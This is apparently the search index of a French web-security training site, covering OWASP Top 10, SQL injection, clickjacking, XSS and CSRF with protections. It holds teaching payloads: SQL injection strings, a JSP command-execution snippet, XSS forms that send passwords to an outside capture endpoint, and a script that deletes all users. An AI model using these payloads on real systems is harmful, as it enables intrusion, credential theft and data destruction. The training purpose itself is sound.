var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(n){const s=suggestions.classList.contains("d-none");if(s)return;const e=[...suggestions.querySelectorAll("a")];if(e.length===0)return;const t=e.indexOf(document.activeElement);if(n.key==="ArrowUp"){n.preventDefault();const s=t>0?t-1:0;e[s].focus()}else if(n.key==="ArrowDown"){n.preventDefault();const s=t+1<e.length?t+1:t;e[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/authentification/",title:"Authentification",description:"",content:""}).add({id:1,href:"/docs/https/",title:"Https",description:"",content:""}).add({id:2,href:"/docs/failles/",title:"Failles applicatives",description:"",content:""}).add({id:3,href:"/docs/intro/",title:"Introduction",description:"",content:""}).add({id:4,href:"/docs/intro/grands-principes/",title:"Les grands principes de la sÃ©curitÃ©",description:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.",content:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.)  ðŸ‘‰  L'intÃ©gritÃ© est trÃ¨s difficilement dissociable de la confidentialitÃ©  Une appli sans HTTPS n'est plus envisageable aujourd'hui    Un kit de survie du HTTPS sera abordÃ© dans la partie HTTPS de la formation. Il s\u0026rsquo;agit de connaitre les principes de base, afin de pouvoir aprÃ©hender les principales erreurs relative Ã  une configuration HTTPS.\n Authentification #  Une opÃ©ration n\u0026rsquo;est accessible qu\u0026rsquo;Ã  ceux qui sont censÃ© rÃ©aliser l\u0026rsquo;opÃ©ration Prouver qu\u0026rsquo;on est celui qu\u0026rsquo;on dÃ©clare Ãªtre  On parle de facteurs d\u0026rsquo;authentification pour chaque preuve que l\u0026rsquo;on peut aborder\n Ce que je sais : mot de passe Ce que je possÃ¨de : certificat, carte Ã  puce, badge Ce que je suis : empreinte digitale, rÃ©tinienne   Une grande partie de cette formation se focalise sur les enjeux et les moyens concret de mettre en place une authentification sur son application\n TraÃ§abilitÃ© #  ÃŠtre capable de savoir ce qui s\u0026rsquo;est passÃ© sur un serveur et par qui Avoir un systÃ¨me de logs,\u0026hellip; Connaitre son sytÃ¨me de logs !!! Avoirs des moyens efficace de rechercher une information dans ses logs   Ne sera pas abordÃ© dans cette formation, mais reste une Ã©tape indispensable Ã  la reflexion de la sÃ©curitÃ© de son application. Le jour on aura besoin de savoir ce qu\u0026rsquo;il s\u0026rsquo;est passÃ©, ce sera trop tard pour y penser\u0026hellip;\n Non rÃ©pudiation #  Un utilisateur ne peut nier une action effectuÃ©e \u0026ldquo;Signature d\u0026rsquo;un contrat\u0026rdquo; Principe de la signature Ã©lectronique   Hors scope de cette formation\n Pour aller plus loin #  Auto-formation aux grands concepts de la sÃ©curitÃ© par l\u0026rsquo;ANSSI : https://www.secnumacademie.gouv.fr/  "}).add({id:5,href:"/docs/failles/intro/",title:"Qu'est ce qu'une faille applicative ?",description:"Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.",content:" Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.\n  Les failles applicatives peuvent Ãªtre causÃ©es par une mauvaise conception de l\u0026rsquo;application, des erreurs de programmation, des problÃ¨mes de configuration ou des erreurs humaines. Certaines des vulnÃ©rabilitÃ©s les plus courantes comprennent les injections SQL, les attaques de scripts entre sites (XSS), les attaques de falsification de demande intersite (CSRF), les failles d\u0026rsquo;authentification, les failles de contrÃ´le d\u0026rsquo;accÃ¨s, les erreurs de validation de donnÃ©es, etc.\n  Il est important pour les dÃ©veloppeurs et les Ã©quipes de sÃ©curitÃ© informatique de dÃ©tecter et de corriger rapidement les failles applicatives pour Ã©viter que des attaquants ne profitent de ces vulnÃ©rabilitÃ©s. Les tests de sÃ©curitÃ© rÃ©guliers, les examens de code et les audits de sÃ©curitÃ© sont des moyens courants de dÃ©tection et de correction des failles applicatives.\n Grandes catÃ©gories :\n Une erreur de conception ? Une erreur de configuration ? Une erreur de programmation (bug, fonctionnalitÃ© mal implÃ©mentÃ©e) ?  Une erreur de conception ? # Cas 1 :\nSoit une plateforme de rÃ©servation en ligne pour des chambres d\u0026rsquo;hÃ´tel.\nJe propose aux utilisateurs d\u0026rsquo;annuler leurs commandes jusqu\u0026rsquo;Ã  16 h.\nUn concurrent peut facilement pourrir mon hÃ´tel en rÃ©servant toutes les chambres et en les annulant Ã  15h55.\nEst ce que cela fait partie du fonctionnement normal ?\nCas 2 :\nSur mon web service de gestion d\u0026rsquo;annuaire, on peut crÃ©er autant d\u0026rsquo;habilitations que l\u0026rsquo;on veut pour un contact\nAu delÃ  d\u0026rsquo;environ 300 habilitations c\u0026rsquo;est l\u0026rsquo;annuaire qui finit par planter\u0026hellip;\nProblÃ©matiques Ã  la conception :\n S\u0026rsquo;assurer que par design certains processus ne seront pas forcÃ©ment soumis Ã  des instabilitÃ©s ConnaÃ®tre les limites de son systÃ¨me  Une erreur de configuration ? # Quelques exemples :\n L\u0026rsquo;application n\u0026rsquo;est pas proposÃ©e et forcÃ©e en HTTPS Flux trop large en entrÃ©e (par exemple possiblitÃ© de connexion sur ports d\u0026rsquo;administration ou base de donnÃ©es exposÃ©e) Secrets exposÃ©s BibliothÃ¨ques Ã  jour mais avec une configuration permettant de faire n\u0026rsquo;importe quoi (mode.debug=true ou conf.developpement=true) \u0026hellip;  Une erreur de programmation ? #  Son propre code Le code des autres, dit autrement les bibliothÃ¨ques utilisÃ©es : NÃ©cÃ©ssitÃ© de mise Ã  jour rÃ©guliÃ¨re !  Le top 10 des vulnÃ©rabilitÃ©s : OWASP\nhttps://owasp.org/www-project-top-ten/\n A1 : Acceder Ã  une ressource non prÃ©vue :  Mauvaise gestion des droits En forcant un utilisateur privilÃ©giÃ© Ã  cliquer sur l\u0026rsquo;action souhaitÃ©e = XSS y compris injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; Vol de session : consÃ©quence de XSS et d\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo;   A2 : Ne pas ou mal utiliser un canal chiffrÃ©  Protocoles obsolÃ¨tes, contrÃ´les non effectuÃ©s HTTPS non obligatoire   A3 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;  Faire Ã©xÃ©cuter du code non prÃ©vu en particulier directement sur la base de donnÃ©es   A4 : Erreur de conception  La meilleure des implÃ©mentations ne corrigera pas   A5 : Erreur de configuration A6 : BibliothÃ¨ques pas Ã  jour (ou utilisation de bibliothÃ¨ques abandonnÃ©es)  Bugs des \u0026ldquo;autres\u0026rdquo;   A7 : Failblesses d\u0026rsquo;authentification  PossibilitÃ© de brute force Mots de passe faibles ou trop standards DÃ©connexions et invalidation de session mal gÃ©rÃ©s   A8 : Non controles d\u0026rsquo;intÃ©gritÃ©  DonnÃ©es entrantes (au run) BibliothÃ¨ques vÃ©rolÃ©es (au build)   A9 : DÃ©faut de tracabilitÃ©  Logs inexploitables Impossible de savoir clairement qui a fait quoi et quand   A10 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;, vision rÃ©seau  SÃ©curitÃ© en profondeur, cloisonnement rÃ©seau Comptes applicatif Ã  droits limitÃ©s    Une petite typologie d\u0026rsquo;attaque et de protection # Disclaimer : Cette typologie est volontairement trÃ¨s rÃ©ductrice !\nOn diffÃ©renciera par la suite deux grands types d\u0026rsquo;attaque et deux grand types de protection.\nLes attaques directes # L\u0026rsquo;attaquant va directement taper sur le serveur cible.\nLes attaques indirectes # L\u0026rsquo;attaquant va forcer un utilisateur avec les droits requis Ã  faire l\u0026rsquo;action pour lui.\nLes protections actives # On rajoute des entraves sur l\u0026rsquo;accÃ¨s au serveur qui serait clible de l\u0026rsquo;attaque.\nLes protection passives ou dÃ©claratives # Je vais donner Ã  l\u0026rsquo;utilisateur (et notamment au navigateur de l\u0026rsquo;utilisateur !) des rÃ¨gles sur ce Ã  quoi ressemble une requÃªte lÃ©gitime, pour dÃ©tecter et bloquer tout ce qui en diverge.\nIllustration # Pour illustrer, imaginons hors domaine informatique que je suis un vil voleur souhaitant m\u0026rsquo;emparer d\u0026rsquo;un lingot d\u0026rsquo;or dans le coffre fort de M Alphonse Robichu.\nLes attaques directes\n Je pÃ©nÃ¨tre dans la banque, je met un baton de dynamite, le coffre explose, je rÃ©cupÃ¨re le lingot.  Les attaques indirectes\n Je vais voir un prÃ©posÃ© de la banque qui stocke le coffre fort, je sais qu\u0026rsquo;il possÃ¨de une clÃ© admin qui ouvre tous les coffres. Je lui dit que je suis Alphonse Robichu et que je souhaite qu\u0026rsquo;il aille rÃ©cupÃ©rer le lingot pour moi dans le coffre.  Les protections actives\n Je change la structure de mes coffres pour qu\u0026rsquo;ils soient Ã  l\u0026rsquo;Ã©preuve de la dynamite.  On remarquera que cette protection est totalement inefficace sur l\u0026rsquo;attaque \u0026ldquo;indirecte\u0026rdquo; prÃ©cÃ©dente\nLes protection passives\n J\u0026rsquo;explique au prÃ©posÃ© que seul les clients muni d\u0026rsquo;une carte d\u0026rsquo;identitÃ© valide peuvent faire ce genre de demande.  Ma protection ne marche que si j\u0026rsquo;ai confiance dans le respect du processus par mon prÃ©posÃ©\nSynthÃ¨se # Deux grands types de protection\n VÃ©rifier les entrÃ©es utilisateurs ! (SÃ©curitÃ© active) VÃ©rifier que l\u0026rsquo;utilisateur est bien conscient de ses actions :  VÃ©rification d\u0026rsquo;Ã©tat (SÃ©curitÃ© active) Dire au navigateur quelles opÃ©rations sont lÃ©gitimes ou non (SÃ©curitÃ© dÃ©clarative)    S\u0026rsquo;initier aux failles applicatives #  OWASP  Documentation et notamment le OWASP top 10 WebGoat (dÃ©couverte de failles sous forme de cours) Juice Store (challenges)   Natas Root Me  Par ailleurs le CERT-FR est un sytÃ¨me de notification des failles applicatives. Il publie aussi rÃ©guliÃ¨rement des articles de cybersÃ©curitÃ©.\nSurveiller les dÃ©pendances obsolÃ¨tes #  Dependabot (vÃ©rification existance d\u0026rsquo;une nouvelle version) Pour vÃ©rifier vulnÃ©rabilitÃ©s connues : https://owasp.org/www-project-dependency-check/  "}).add({id:6,href:"/docs/failles/serveur/",title:"Les attaques directes",description:'L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; #  https://xkcd.com/license.html  Que s\u0026rsquo;est-il passÃ© ?\n var injection = function () { var body = document.getElementsByTagName("body")[0]; var myTxt = document.getElementById("scriptEvil0").value; var displayText; // if (myTxt === "Robert\'); DROP TABLE Students;--"){ if (myTxt.indexOf("\'")  -1) { displayText = "Oui, pour tester une attaque par injection on tente de mettre une \' dans le champ !"; } else { displayText = myTxt + " a Ã©tÃ© ajoutÃ© en base"',content:"L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; #  https://xkcd.com/license.html  Que s\u0026rsquo;est-il passÃ© ?\n var injection = function () { var body = document.getElementsByTagName(\"body\")[0]; var myTxt = document.getElementById(\"scriptEvil0\").value; var displayText; // if (myTxt === \"Robert'); DROP TABLE Students;--\"){ if (myTxt.indexOf(\"'\")  -1) { displayText = \"Oui, pour tester une attaque par injection on tente de mettre une ' dans le champ !\"; } else { displayText = myTxt + \" a Ã©tÃ© ajoutÃ© en base\"; } myUl = document.getElementById(\"myUl0\"); node = document.createElement(\"LI\"); txt = document.createTextNode(displayText); node.appendChild(txt); myUl.appendChild(node); }   Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n  Le code ressemble Ã  Ã§a :\npublic void inscrireEleve(String prenom){ String maRequeteSQL = \u0026quot;INSERT INTO Students VALUES ('\u0026quot; + prenom + \u0026quot;')\u0026quot;; connectionSql.createStatement().executeQuery(maRequeteSQL); }  Si on remplit dans le formulaire Robert'); DROP TABLE Students;-- La requÃ¨te envoyÃ©e au serveur devient :\nINSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')  Injection SQL\nPourquoi ?\n Consulter des donnÃ©es confidentielles AltÃ©rer la base de donnÃ©es  Attaque DIRECTE\nOn remarque que ce type d\u0026rsquo;attaque se produit quand un langage fait appel Ã  un autre langage. Un code java par exemple lance des requetes sql ou ldap moyennant ces chaines de caracteres.\n\u0026quot;SELECT * FROM USER WHERE identifiant='\u0026quot; + username + \u0026quot;' AND password='\u0026quot; + password + \u0026quot;'\u0026quot;;  Ã  renseigner avec username=robichu et password=' OR '1'='1' -- pour se connecter en tant que M Robichu\nLa sÃ©curitÃ© va donc consister essentiellement Ã  repÃ©rer ces possibles manipulation de la chaÃ®nes, c\u0026rsquo;est Ã  dire repÃ©rer les caracteres spÃ©ciaux du langage cible et les Ã©chapper selon les modes d\u0026rsquo;Ã©chappement du langages.\nOn rÃ©Ã©criera ' OR '1'='1' -- en '' OR ''1''=''1'' --\nProtection ACTIVE\nConcrÃ¨tement, on n\u0026rsquo;est pas les premieres Ã  se dire qu\u0026rsquo;il faut Ã©chapper des caractÃ¨res, il faut s\u0026rsquo;appuyer au maximum sur des bibliotheques Ã©prouvÃ©es. Toujours dans le cas de sql :\n Utiliser des PreparedStatement Mieux, Utiliser des Frameworks qui font le boulot sans que l\u0026rsquo;on gÃ¨re vraiment le sql (hibernate, \u0026hellip;) Des bibliothÃ¨ques que l\u0026rsquo;on garde Ã  jour bien entendu  Un peu de pratique\u0026hellip; # DÃ©couvrons une sÃ©rie challenge disponible sur internet\n Natas 0 (mot de passe de natas0 : natas0) Sur les premiers niveaux, on voit qu\u0026rsquo;une resource cachÃ©e n\u0026rsquo;est jamais cachÃ©e (Digression : robots.txt) et que quelques Ã©lÃ©ments pouvent Ãªtre trÃ¨s facilement manipulÃ©s dans la requÃªte  L\u0026rsquo;injection de code : le retour de la revanche # Quelques niveaux plus tard :\n Natas 12 (mot de passe de natas12 : YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG) Le but est de dÃ©couvrir le mot de passe de natas13 situÃ© dans /etc/natas_webpass/natas13 Hint : passthru est une fonction php permettant d\u0026rsquo;Ã©xÃ©cuter sur le sytÃ¨me du code arbitraire  ExÃ©cution de code sur le serveur\n Mettre un fichier malicieux sur le serveur permettant l\u0026rsquo;Ã©xÃ©cution de code Ã  distance. Ici le code injectÃ© sera du code Ã©xÃ©cutÃ© cÃ´tÃ© serveur (java sur jsp, php)  L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;\n  ExÃ©cution de code sur le serveur au plus prÃ¨s du systÃ¨me\n  Rebond sur le SI possible si :\n flux larges entre les diffÃ©rents serveurs compte Ã©xÃ©cutant le code Ã  haut privilÃ¨ge    Nombreuses possibilitÃ©s : aussi bien des traitements dans l\u0026rsquo;application non prÃ©vus que des opÃ©rations directement sur le systÃ¨me d\u0026rsquo;exploitation\n  Par exemple rÃ©ussir Ã  placer sur le serveur une jsp contenant :\n  \u0026lt;%Runtime.getRuntime().exec(\u0026quot;less /confidentiel/data\u0026quot;);%\u0026gt;   Un langage de programmation lance indirectement des commandes systÃ¨me  SÃ©curitÃ© : #  ContrÃ´ler les entrÃ©es utilisateurs et en particulier pour les fichiers :  le type MIME des entrÃ©es, la cohÃ©rence type attendu et contenu autant que possible l\u0026rsquo;extention de fichier nommÃ© car le serveur et/ou le navigateur peut interprÃ©ter diffÃ©remment un fichier selon son nommage    SÃ©curitÃ© : #  CÃ´tÃ© prod :  \u0026ldquo;chroot\u0026rdquo; des applications ou machines limitÃ© Ã  un traitement utilisateur Ã©xÃ©cutant l\u0026rsquo;application avec droit limitÃ©s (ce n\u0026rsquo;est pas le compte root/admin qui dÃ©marre le tomcat) flux limitÃ©s entre machines    L\u0026rsquo;injection de code : SynthÃ¨se #  Un sujet central : l\u0026rsquo;entrÃ©e untilisateur  Mais qu\u0026rsquo;est ce qu\u0026rsquo;une entrÃ©e utilisateur ?\n RequÃªte et ParamÃ¨tres de requÃªte Corps de requÃªte (contenu des requÃªte POST et PUT) : rÃ©ponse Ã  un formulaire, fichier Cookies Entetes HTTP (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, \u0026hellip;)  Controle des chaines entrÃ©es et Ã©chappement de tous les caratÃ¨res interprÃ©tables en html, en sql,\u0026hellip; selon la situation.\nUn dÃ©veloppeur web peut se contenter de surveiller ces entrÃ©es mais en rÃ©alitÃ©, les failles peuvent survenir sur n\u0026rsquo;importe quel bit d\u0026rsquo;un Ã©change rÃ©seau.\nUne attaque rÃ©elle pour illustrer #  Log4Shell Decembre 2021 https://fr.wikipedia.org/wiki/Log4Shell Voir projet exploit Exploiter avec https://canarytokens.org/generate  "}).add({id:7,href:"/docs/failles/client/",title:"Les attaques basÃ©es sur des croisements de domaines",description:"Objectifs de l\u0026rsquo;attaquant :\n Un utilisateur connectÃ© sur un site lÃ©gitime envoie des donnÃ©es Ã  un site attaquant Un site attaquant force un utilisateur Ã  faire une opÃ©ration non souhaitÃ© sur le site lÃ©gitime  Le clickjacking # Vous avez GagnÃ© Cliquez la\n Vous avez GagnÃ©, regardez mieux Cliquez la\n Les \u0026lt;iframe\u0026gt;\n Principe lÃ©gitime Ã  la base : afficher une page web sur une autre page web Comportements dÃ©tournÃ©s Clickjacking = on cache une iframe par dessus un bouton aparemment lÃ©gitime  \u0026lt;iframe style=\u0026quot;opacity: 0\u0026quot; src=\u0026quot;https://le-site-des-admins\u0026quot;\u0026gt;  XFS Cross Frame Scripting : principe gÃ©nÃ©ral d\u0026rsquo;attaque consistant Ã  injecter le site lÃ©gitime sur le site du pirate via un iframe",content:"Objectifs de l\u0026rsquo;attaquant :\n Un utilisateur connectÃ© sur un site lÃ©gitime envoie des donnÃ©es Ã  un site attaquant Un site attaquant force un utilisateur Ã  faire une opÃ©ration non souhaitÃ© sur le site lÃ©gitime  Le clickjacking # Vous avez GagnÃ© Cliquez la\n Vous avez GagnÃ©, regardez mieux Cliquez la\n Les \u0026lt;iframe\u0026gt;\n Principe lÃ©gitime Ã  la base : afficher une page web sur une autre page web Comportements dÃ©tournÃ©s Clickjacking = on cache une iframe par dessus un bouton aparemment lÃ©gitime  \u0026lt;iframe style=\u0026quot;opacity: 0\u0026quot; src=\u0026quot;https://le-site-des-admins\u0026quot;\u0026gt;  XFS Cross Frame Scripting : principe gÃ©nÃ©ral d\u0026rsquo;attaque consistant Ã  injecter le site lÃ©gitime sur le site du pirate via un iframe\nAttaque INDIRECTE\n=\u0026gt; Protection PASSIVE\n on va dire au navigateur que le site n\u0026rsquo;a aucune raison lÃ©gitime d\u0026rsquo;Ãªtre dans une iframe  Des entÃªtes standards existent :  X-Frame-Options:\u0026lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/\u0026gt;;   On filtre donc les origines qui ont le droit d\u0026rsquo;afficher l\u0026rsquo;iframe /!\\ Absence d\u0026rsquo;entÃªte = autorisÃ© de n\u0026rsquo;importe quel source    L\u0026rsquo;injection de code\u0026hellip; cÃ´tÃ© client ! #  var fonction = function () { myUl = document.getElementById(\"myUl\"); myTxt = document.getElementById(\"scriptEvil\").value; var node = document.createElement(\"LI\"); node.innerHTML = myTxt; myUl.appendChild(node); }   Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n  Et si j\u0026rsquo;Ã©crit dans le formulaire :\n\u0026lt;form action=\u0026quot;https://securite-applicative.free.beeceptor.com\u0026quot; \u0026gt;Entrez votre mot de passe : \u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; formtarget=\u0026quot;_blank\u0026quot;\u0026gt;Me connecter\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;  Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative\nDÃ©clinable Ã  souhait\u0026hellip;\n\u0026lt;button onclick=\u0026quot;window.location='https://securite-applicative.free.beeceptor.com'\u0026quot; \u0026gt;Continuer\u0026lt;/button\u0026gt;  On peut ainsi forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action\n En le redirigeant sur la page avec des paramÃ¨tres de requete trafiquÃ©s En stockant en base un code qui va Ãªtre rÃ©affichÃ©  On peut ainsi rajouter ce genre de code sur la page de l\u0026rsquo;utilisateur\n\u0026lt;script\u0026gt;document.location=\u0026quot;https://no.domain\u0026quot;\u0026lt;/script\u0026gt;  \u0026lt;script\u0026gt; document.getElementsByTagName(\u0026quot;body\u0026quot;)[0].innerHTML(\u0026quot; \u0026lt;form action='https://no.domain' \u0026gt; \u0026lt;br\u0026gt;Connectez vous !\u0026lt;br\u0026gt; \u0026lt;input type='text' name='email'\u0026gt; \u0026lt;input type='password' name='mot de passe'\u0026gt; \u0026lt;input type='submit' value='Connexion'\u0026gt; \u0026lt;/form\u0026gt; \u0026quot;) \u0026lt;/script\u0026gt;  On parle de XSS (Cross-Site Scripting)\nPourquoi ?\n Vol de donnÃ©es, en particulier des cookies de session (explications) Redirection malveillante  Comment ?\n Consiste Ã  injecter du code et en particulier des script dans une page web (donc Ã©xÃ©cutÃ© par l\u0026rsquo;utilisateur dans son navigateur) L\u0026rsquo;attaquant fournit une requÃªte vers un site lÃ©gitime mais dont le contenu injecte le code L\u0026rsquo;attaquant peut aussi profiter d\u0026rsquo;une non validation des donnÃ©es persistantes (BDD)  Plusieurs types de XSS\n Injection \u0026ldquo;en direct\u0026rdquo; par le serveur, on parle de reflected XSS On l\u0026rsquo;appelle DOM XSS, si elle consiste Ã  modifier le DOM via un script Pire, XSS Stored : le pirate arrive Ã  Ã©crire ce code dans une base de donnÃ©es ou dans un fichier local. Il n\u0026rsquo;a mÃªme plus besoin de fournir un lien trafiquÃ© Ã  l\u0026rsquo;utilisateur.  Attaque INDIRECTE =\u0026gt; Protection PASSIVE .. et un peu ACTIVE\nSÃ©curitÃ© active :\n VÃ©rifier les entrÃ©es utilisateurs ! Echapper caractÃ¨res spÃ©ciaux HTML (utiliser au maximum les sÃ©curitÃ©s internes des framework, sinon des fonctions existent dÃ©jÃ  dans les principaux langages, par exemple ${fn:escapeXml(string)} dans une EL en JSP)  SÃ©curitÃ© passive :\n RÃ©sumÃ© des headers Content Security Policy (CSP) Prez Spec (deprecated) X-XSS-Protection  ComplÃ©ments pour la protection des cookies\n Forcer les cookies Ã  Ãªtre \u0026ldquo;secure\u0026rdquo; (utilisable en https uniquement), \u0026ldquo;httpOnly\u0026rdquo; (non utilisable dans les scripts) PrÃ©cision : il s\u0026rsquo;agit de sÃ©curitÃ© dÃ©clarative dont la mise en oeuvre est Ã  la charge du navigateur  Les attaques CSRF # Si on combine les failles prÃ©cÃ©dentes :\n Une inteface grand public qui permet de stocker librement du texte non vÃ©rifiÃ© (disons une interface \u0026ldquo;contacter l\u0026rsquo;admin\u0026rdquo;) Une interface admin qui affiche des messages sans controle Un autre site de gestion ou l\u0026rsquo;admin est prÃ©alablement connectÃ© (ou auquel la connexion SSO est invisible)   var fonction_csrf = function () {	myTxt = document.getElementById(\"scriptEvil_csrf\").value; window.localStorage.setItem('message_csrf', myTxt); }   Ã‰cole municipale de Kelkepare # Envoyez un message Ã  l\u0026rsquo;admin\nVotre message : Envoyez !\n (https://admin-message.kelkepare.com)\nInterface Admin # Vos messages :\n  (https://admin-base.kelkepare.com)\nInterface admin bis #  ajoutersupprimer eleveallUsers Je sais ce que je fais    myUl = document.getElementById(\"myUl_csrf\"); var node = document.createElement(\"LI\"); node.innerHTML = window.localStorage.getItem('message_csrf'); myUl.appendChild(node);  Si on envoie le message suivant ?\n\u0026lt;script\u0026gt; var request = new XMLHttpRequest(); request.open('POST', 'https://admin-base.kelkepare.com/cible-du-form', false); resquest.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;multipart/form-data; boundary=---------------------------395028195436618018493550684239\u0026quot;); request.send(\u0026quot;-----------------------------395028195436618018493550684239\\n\u0026quot;+ \u0026quot;Content-Disposition: form-data; name='action'\\n\u0026quot;+ \u0026quot;\\n\u0026quot;+ \u0026quot;supprimer\\n\u0026quot;+ \u0026quot;-----------------------------395028195436618018493550684239\\n\u0026quot;+ \u0026quot;Content-Disposition: form-data; name='quoi'\\n\u0026quot;+ \u0026quot;\\n\u0026quot;+ \u0026quot;allUsers\\n\u0026quot;+ \u0026quot;-----------------------------395028195436618018493550684239--\u0026quot; ); 